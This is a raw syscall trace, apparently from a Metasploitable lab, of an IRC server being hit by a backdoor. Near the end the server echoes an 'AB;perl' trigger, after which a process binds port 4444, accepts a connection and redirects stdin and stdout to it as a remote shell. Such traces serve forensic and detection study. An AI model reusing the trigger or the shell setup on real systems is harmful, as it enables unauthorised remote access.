9852  20:00:44.470936 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470948 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470962 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470975 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470988 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471001 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471014 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471026 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471039 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471051 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471065 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471088 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471102 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471115 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471131 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471144 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471157 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471169 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471183 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471195 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471208 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471221 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471234 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.471246 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.471259 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9852  20:00:44.471278 munmap(0xb7dcd000, 29913) = 0
9852  20:00:44.471300 open("/etc/ld.so.cache", O_RDONLY) = 6
9852  20:00:44.471313 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9852  20:00:44.471330 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7dcd000
9852  20:00:44.471341 close(6)          = 0
9852  20:00:44.471352 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9852  20:00:44.471367 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
9852  20:00:44.471382 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
9852  20:00:44.471475 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
9852  20:00:44.471502 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7dc2000
9852  20:00:44.471514 mmap2(0xb7dcb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7dcb000
9852  20:00:44.471532 close(6)          = 0
9852  20:00:44.471557 munmap(0xb7dcd000, 29913) = 0
9852  20:00:44.471582 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
9852  20:00:44.471601 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
9852  20:00:44.471617 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
9852  20:00:44.471634 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dd4000
9852  20:00:44.471646 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
9852  20:00:44.471837 close(6)          = 0
9852  20:00:44.471848 munmap(0xb7dd4000, 4096) = 0
9852  20:00:44.471875 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
9852  20:00:44.471889 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
9852  20:00:44.471906 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dd4000
9852  20:00:44.471917 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
9852  20:00:44.472106 close(6)          = 0
9852  20:00:44.472116 munmap(0xb7dd4000, 4096) = 0
9852  20:00:44.472151 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
9852  20:00:44.472175 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f0398) = -1 EINVAL (Invalid argument)
9852  20:00:44.472189 _llseek(6, 0, 0xbf9f03e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9852  20:00:44.472201 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f0398) = -1 EINVAL (Invalid argument)
9852  20:00:44.472212 _llseek(6, 0, 0xbf9f03e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9852  20:00:44.472222 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
9852  20:00:44.472286 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
9852  20:00:44.472326 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
9852  20:00:44.472352 listen(6, 5)      = 0
9852  20:00:44.472416 accept(6,  <unfinished ...>
9851  20:00:44.479460 exit_group(0)     = ?
9849  20:00:44.479574 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 9851
9849  20:00:44.479590 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9849  20:00:44.479602 --- SIGCHLD (Child exited) @ 0 (0) ---
9849  20:00:44.479610 waitpid(-1, 0xbfcd4848, WNOHANG) = -1 ECHILD (No child processes)
9849  20:00:44.479662 sigreturn()       = ? (mask now [])
9849  20:00:44.479681 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
9849  20:00:44.479740 exit_group(0)     = ?
4519  20:00:44.479778 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 9849
4519  20:00:44.479790 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  20:00:44.479804 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  20:00:44.479815 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  20:00:44.479824 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  20:00:44.479843 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  20:00:44.479907 time(NULL)        = 1495670444
4519  20:00:44.479917 time(NULL)        = 1495670444
4519  20:00:44.479955 gettimeofday({1495670444, 479976}, NULL) = 0
4519  20:00:44.479986 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:00:44.480016 clock_gettime(CLOCK_MONOTONIC, {47254, 297029068}) = 0
4519  20:00:44.480028 gettimeofday({1495670444, 480032}, NULL) = 0
4519  20:00:44.480039 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 2 (in [4 7], left {1, 0})
4519  20:00:44.480079 clock_gettime(CLOCK_MONOTONIC, {47254, 297091733}) = 0
4519  20:00:44.480090 recv(7, "PRIVMSG  #testit1 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\nCPRIVMSG botnick\n", 8192, 0) = 88
4519  20:00:44.480186 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480218 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480232 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480246 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480259 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480273 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480286 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480300 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480313 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480326 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480339 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480352 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480366 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480379 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480392 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480405 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480418 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480432 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480445 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480460 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480474 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480487 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:44.480508 send(7, ":irc.Metasploitable.LAN 421 bla2 CPRIVMSG :Unknown command\r\n", 60, 0) = 60
4519  20:00:44.480532 recv(4, "NOTICE  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 70
4519  20:00:44.480554 gettimeofday({1495670444, 480558}, NULL) = 0
4519  20:00:44.480566 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {0, 890000})
4519  20:00:44.618833 clock_gettime(CLOCK_MONOTONIC, {47254, 435842511}) = 0
4519  20:00:44.618834 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  20:00:44.618834 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  20:00:44.618847 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  20:00:44.618865 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  20:00:44.618906 close(5)          = 0
4519  20:00:44.618921 time(NULL)        = 1495670444
4519  20:00:44.618931 time(NULL)        = 1495670444
4519  20:00:44.618942 gettimeofday({1495670444, 618946}, NULL) = 0
4519  20:00:44.618955 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:00:44.618984 clock_gettime(CLOCK_MONOTONIC, {47254, 435997518}) = 0
4519  20:00:44.618995 gettimeofday({1495670444, 618999}, NULL) = 0
4519  20:00:44.619006 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
9852  20:00:44.718791 <... accept resumed> {sa_family=AF_INET, sin_port=htons(42125), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
9852  20:00:44.718835 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef388) = -1 EINVAL (Invalid argument)
9852  20:00:44.718852 _llseek(8, 0, 0xbf9ef3d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9852  20:00:44.718865 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef388) = -1 EINVAL (Invalid argument)
9852  20:00:44.718876 _llseek(8, 0, 0xbf9ef3d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9852  20:00:44.718898 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
9852  20:00:44.718941 close(6)          = 0
9852  20:00:44.719012 dup(8)            = 6
9852  20:00:44.719026 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f0228) = -1 EINVAL (Invalid argument)
9852  20:00:44.719037 _llseek(6, 0, 0xbf9f0270, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9852  20:00:44.719048 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
9852  20:00:44.719068 dup2(6, 1)        = 1
9852  20:00:44.719080 close(6)          = 0
9852  20:00:44.719091 fcntl64(1, F_SETFD, 0) = 0
9852  20:00:44.719102 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f01f8) = -1 EINVAL (Invalid argument)
9852  20:00:44.719113 _llseek(1, 0, 0xbf9f0240, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9852  20:00:44.719143 dup(8)            = 6
9852  20:00:44.719155 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f0228) = -1 EINVAL (Invalid argument)
9852  20:00:44.719166 _llseek(6, 0, 0xbf9f0270, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9852  20:00:44.719176 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
9852  20:00:44.719192 dup2(6, 0)        = 0
9852  20:00:44.719202 close(6)          = 0
9852  20:00:44.719210 fcntl64(0, F_SETFD, 0) = 0
9852  20:00:44.719210 fcntl64(0, F_SETFD, 0) = 0
9852  20:00:44.719210 read(0,  <unfinished ...>
4519  20:00:45.129172 <... select resumed> ) = 1 (in [9], left {0, 500000})
